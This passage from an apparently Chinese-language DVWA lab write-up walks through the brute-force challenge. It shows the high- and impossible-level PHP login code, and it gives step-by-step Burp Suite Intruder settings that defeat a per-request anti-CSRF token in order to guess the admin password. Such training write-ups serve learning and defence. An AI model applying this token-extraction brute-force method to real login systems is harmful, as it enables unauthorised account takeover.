punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token comment\">// Get users details</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token variable\">$row</span>    <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_fetch_assoc</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$result</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token variable\">$avatar</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"avatar\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token comment\">// Login successful</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;p>Welcome to the password protected area <span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token variable\">$user</span><span class=\"token punctuation\">&#125;</span></span>&lt;/p>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;img src=\\\"<span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token variable\">$avatar</span><span class=\"token punctuation\">&#125;</span></span>\\\" />\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        <span class=\"token comment\">// Login failed</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        <span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span> <span class=\"token function\">rand</span><span class=\"token punctuation\">(</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;pre>&lt;br />Username and/or password incorrect.&lt;/pre>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token function\">is_null</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$___mysqli_res</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_close</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token constant boolean\">false</span> <span class=\"token punctuation\">:</span> <span class=\"token variable\">$___mysqli_res</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token comment\">// Generate Anti-CSRF token</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token function\">generateSessionToken</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p><code>generateSessionToken();</code>  根据注释可以理解：用于生成反 CSRF 令牌</p>\n<p>​\t这段代码放到最后，说明无论登录成功或失败，他都会生成新的 <code>session_token</code></p>\n<p><code> checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );</code></p>\n<p>​\t根据注释可以理解：检查反 CSRF 令牌。</p>\n<p>​\t我们详细分析一下。（这里先不分析 CSRF，就针对暴力破解来分析。）</p>\n<p>​\tSession 意思是会话。当用户访问服务器，就开始了一次会话，这个时候服务器为用户生成一个 session（会话），sessionID 表示这\t个会话的唯一标识。</p>\n<p>​\t <code>$_SESSION[ 'session_token' ]</code>  读取 <code>generateSessionToken()</code>  生成的会话令牌 ( <code>session_token</code> )</p>\n<p>​\t <code>$_REQUEST[ 'user_token' ]</code>  读取请求中的用户令牌（ <code>user_token</code> ）</p>\n<p>​\t我们无法查看 checkToken () 函数的源码，但可以确定是检测 user_token 和 session_token 的，如果这个函数检查不通过用户名和密码正确也登录不了。</p>\n<p><code>generateSessionToken()</code>  生成 session_token 是放在服务端进行的，即使我们反复登录，checkToken () 也能正确的读取 session_token, 因此不是影响暴力破解的因素。</p>\n<p>影响暴力破解的因素就是 user_token，只要每次都能获取正确的 user_token，便可完成暴力破解。</p>\n<p>我们在该页面，右键查看源代码可见 <code>user_token</code> ，在刷新时，这个 <code>user_token</code>  是会发生改变的。</p>\n<p><img loading=\"lazy\" data-src=\"image-20240516114145902-1721199923435-8.png\" alt=\"image-20240516114145902\" /></p>\n<p>打开 BurpSuite 抓包，输入用户名 admin，密码随便输，点击登录，将抓到的结果发送到 Intruder</p>\n<p>选择 Pitchfork 攻击类型，选取密码和 user_token 作为变量</p>\n<p><img loading=\"lazy\" data-src=\"image-20240516130231157-1721199923435-9.png\" alt=\"image-20240516130231157\" /></p>\n<p>先点击 Setting 选项卡，找到 Grep-Extract（提取响应消息中的有用信息），点击 Add, 点击 refetch response, 双击 token 值，点 ok</p>\n<p><img loading=\"lazy\" data-src=\"image-20240516133012978-1721199923435-11.png\" alt=\"image-20240516133012978\" /></p>\n<p>往下翻，Redirections 设置为 Always，这个配置是说攻击时，Burp Suite 怎么处理重定向，配置成总是跟随重定向</p>\n<p><img loading=\"lazy\" data-src=\"image-20240516133753597-1721199923435-13.png\" alt=\"image-20240516133753597\" /></p>\n<p>再设置 Resource pool，因为 Recursive_Grep 模式不支持多线程攻击。</p>\n<p>老版本的 BurpSuite 是 option 下的 Request Engine。</p>\n<p>将攻击线程设置为 1，请求间隔设置为 2000ms</p>\n<p><img loading=\"lazy\" data-src=\"image-20240516133455132-1721199923435-12.png\" alt=\"image-20240516133455132\" /></p>\n<p>设置 payload 1，跟前面一样导入密码字典就行</p>\n<p>设置 payload2，注意 payload 类型，填上刚才抓包的 user_token 作为初始 payload，配置完就可以开始攻击了</p>\n<p><img loading=\"lazy\" data-src=\"image-20240516140842169-1721199923435-14.png\" alt=\"image-20240516140842169\" /></p>\n<p>两种方法确定密码，一是反选，就是把反选登录失败时的字段 Username and/or password incorrect.</p>\n<p><img loading=\"lazy\" data-src=\"image-20240516142843489-1721199923435-15.png\" alt=\"image-20240516142843489\" /></p>\n<p><img loading=\"lazy\" data-src=\"image-20240516142927133-1721199923435-16.png\" alt=\"image-20240516142927133\" /></p>\n<p>二是看响应长度，最长那个就是</p>\n<p><img loading=\"lazy\" data-src=\"image-20240516143004429-1721199923435-17.png\" alt=\"image-20240516143004429\" /></p>\n<p>到此 high 级暴力破解完成。</p>\n<h3 id=\"impossible级\"><a class=\"anchor\" href=\"#impossible级\">#</a> impossible 级</h3>\n<p>针对暴力破解，GET 提交方式改为 POST 提交方式，也加入了 token 校验，同时限制登录次数，如果登录失败三次账户就会被锁定，需要等待 15 分钟才能尝试。</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'Login'</span> <span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">isset</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'username'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">isset</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token comment\">// 检查 token</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token function\">checkToken</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'user_token'</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'session_token'</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'index.php'</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token comment\">// 用户名输入保护措施，过滤一些特殊字符</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token variable\">$user</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'username'</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token variable\">$user</span> <span class=\"token operator\">=</span> <span class=\"token function\">stripslashes</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$user</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 返回一个去除转义反斜线后的字符串（\\' 转换为 ' 等等）。双反斜线（\\\\）被转换为单个反斜线（\\）</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token variable\">$user</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">is_object</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token function\">mysqli_real_escape_string</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>  <span class=\"token variable\">$user</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token function\">trigger_error</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\"</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">E_USER_ERROR</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token string double-quoted-string\">\"\"</span> <span class=\"token punctuation\">:</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token comment\">// 密码输入保护措施</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token variable\">$pass</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'password'</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token variable\">$pass</span> <span class=\"token operator\">=</span> <span class=\"token function\">stripslashes</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$pass</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token variable\">$pass</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">is_object</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token function\">mysqli_real_escape_string</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>  <span class=\"token variable\">$pass</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token function\">trigger_error</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\"</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">E_USER_ERROR</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token string double-quoted-string\">\"\"</span> <span class=\"token punctuation\">:</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token variable\">$pass</span> <span class=\"token operator\">=</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$pass</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token comment\">// 默认值，失败次数，锁定时间，账户是否锁定</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token variable\">$total_failed_login</span> <span class=\"token operator\">=</span> <span class=\"token number\">3</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token variable\">$lockout_time</span>       <span class=\"token operator\">=</span> <span class=\"token number\">15</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token variable\">$account_locked</span>     <span class=\"token operator\">=</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token comment\">// 获取最近一次登录时间，还有失败登录次数</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token variable\">$data</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$db</span><span class=\"token operator\">-></span><span class=\"token function\">prepare</span><span class=\"token punctuation\">(</span> <span class=\"token string single-quoted-string\">'SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;'</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token variable\">$data</span><span class=\"token operator\">-></span><span class=\"token function\">bindParam</span><span class=\"token punctuation\">(</span> <span class=\"token string single-quoted-string\">':user'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$user</span><span class=\"token punctuation\">,</span> <span class=\"token class-name static-context\">PDO</span><span class=\"token operator\">::</span><span class=\"token constant\">PARAM_STR</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token variable\">$data</span><span class=\"token operator\">-></span><span class=\"token function\">execute</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token variable\">$row</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$data</span><span class=\"token operator\">-></span><span class=\"token function\">fetch</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token comment\">// 查看用户是否被锁定</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> <span class=\"token punctuation\">(</span> <span class=\"token variable\">$data</span><span class=\"token operator\">-></span><span class=\"token function\">rowCount</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token punctuation\">(</span> <span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'failed_login'</span> <span class=\"token punctuation\">]</span> <span class=\"token operator\">>=</span> <span class=\"token variable\">$total_failed_login</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        <span class=\"token comment\">// User locked out.  Note, using this method would allow for user enumeration!</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        <span class=\"token comment\">//echo \"&lt;pre>&lt;br />This account has been locked due to too many incorrect logins.&lt;/pre>\";</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        <span class=\"token comment\">// 计算何时允许用户再次登录</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        <span class=\"token variable\">$last_login</span> <span class=\"token operator\">=</span> <span class=\"token function\">strtotime</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'last_login'</span> <span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        <span class=\"token variable\">$timeout</span>    <span class=\"token operator\">=</span> <span class=\"token variable\">$last_login</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$lockout_time</span> <span class=\"token operator\">*</span> <span class=\"token number\">60</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        <span class=\"token variable\">$timenow</span>    <span class=\"token operator\">=</span> <span class=\"token function\">time</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>        <span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"40\"></td><td><pre>        print \"The last login was: \" . date (\"h:i:s\", $last_login) . \"&lt;br />\";</pre></td></tr><tr><td data-num=\"41\"></td><td><pre>        print \"The timenow is: \" . date (\"h:i:s\", $timenow) . \"&lt;br />\";</pre></td></tr><tr><td data-num=\"42\"></td><td><pre>        print \"The timeout is: \" . date (\"h:i:s\", $timeout) . \"&lt;br />\";</pre></td></tr><tr><td data-num=\"43\"></td><td><pre>        */</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>        <span class=\"token comment\">// 检查是否已经过去了足够的时间，如果它没有锁定帐户</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$timenow</span> <span class=\"token operator\">&lt;</span> <span class=\"token variable\">$timeout</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>            <span class=\"token variable\">$account_locked</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>            <span class=\"token comment\">// print \"The account is locked&lt;br />\";</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>    <span class=\"token comment\">// 检查数据库（如果用户名与密码匹配）</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>    <span class=\"token variable\">$data</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$db</span><span class=\"token operator\">-></span><span class=\"token function\">prepare</span><span class=\"token punctuation\">(</span> <span class=\"token string single-quoted-string\">'SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;'</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>    <span class=\"token variable\">$data</span><span class=\"token operator\">-></span><span class=\"token function\">bindParam</span><span class=\"token punctuation\">(</span> <span class=\"token string single-quoted-string\">':user'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$user</span><span class=\"token punctuation\">,</span> <span class=\"token class-name static-context\">PDO</span><span class=\"token operator\">::</span><span class=\"token constant\">PARAM_STR</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>    <span class=\"token variable\">$data</span><span class=\"token operator\">-></span><span class=\"token function\">bindParam</span><span class=\"token punctuation\">(</span> <span class=\"token string single-quoted-string\">':password'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$pass</span><span class=\"token punctuation\">,</span> <span class=\"token class-name static-context\">PDO</span><span class=\"token operator\">::</span><span class=\"token constant\">PARAM_STR</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>    <span class=\"token variable\">$data</span><span class=\"token operator\">-></span><span class=\"token function\">execute</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>    <span class=\"token variable\">$row</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$data</span><span class=\"token operator\">-></span><span class=\"token function\">fetch</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>    <span class=\"token comment\">// 如果是有效的登录...</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> <span class=\"token punctuation\">(</span> <span class=\"token variable\">$data</span><span class=\"token operator\">-></span><span class=\"token function\">rowCount</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token punctuation\">(</span> <span class=\"token variable\">$account_locked</span> <span class=\"token operator\">==</span> <span class=\"token constant boolean\">false</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>        <span class=\"token comment\">// 获得用户信息</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>        <span class=\"token variable\">$avatar</span>       <span class=\"token operator\">=</span> <span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'avatar'</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>        <span class=\"token variable\">$failed_login</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'failed_login'</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>        <span class=\"token variable\">$last_login</span>   <span class=\"token operator\">=</span> <span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'last_login'</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>        <span class=\"token comment\">// 登录成功</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;p>Welcome to the password protected area &lt;em><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token variable\">$user</span><span class=\"token punctuation\">&#125;</span></span>&lt;/em>&lt;/p>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;img src=\\\"<span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token variable\">$avatar</span><span class=\"token punctuation\">&#125;</span></span>\\\" />\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>        <span class=\"token comment\">// 自上次登录以来，帐户是否被锁定？</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$failed_login</span> <span class=\"token operator\">>=</span> <span class=\"token variable\">$total_failed_login</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;p>&lt;em>Warning&lt;/em>: Someone might of been brute forcing your account.&lt;/p>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;p>Number of login attempts: &lt;em><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token variable\">$failed_login</span><span class=\"token punctuation\">&#125;</span></span>&lt;/em>.&lt;br />Last login attempt was at: &lt;em>$&#123;last_login&#125;&lt;/em>.&lt;/p>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>        <span class=\"token comment\">// 重置错误的登录计数</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>        <span class=\"token variable\">$data</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$db</span><span class=\"token operator\">-></span><span class=\"token function\">prepare</span><span class=\"token punctuation\">(</span> <span class=\"token string single-quoted-string\">'UPDATE users SET failed_login = \"0\" WHERE user = (:user) LIMIT 1;'</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>        <span class=\"token variable\">$data</span><span class=\"token operator\">-></span><span class=\"token function\">bindParam</span><span class=\"token punctuation\">(</span> <span class=\"token string single-quoted-string\">':user'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$user</span><span class=\"token punctuation\">,</span> <span class=\"token class-name static-context\">PDO</span><span class=\"token operator\">::</span><span class=\"token constant\">PARAM_STR</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>        <span class=\"token variable\">$data</span><span class=\"token operator\">-></span><span class=\"token function\">execute</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token 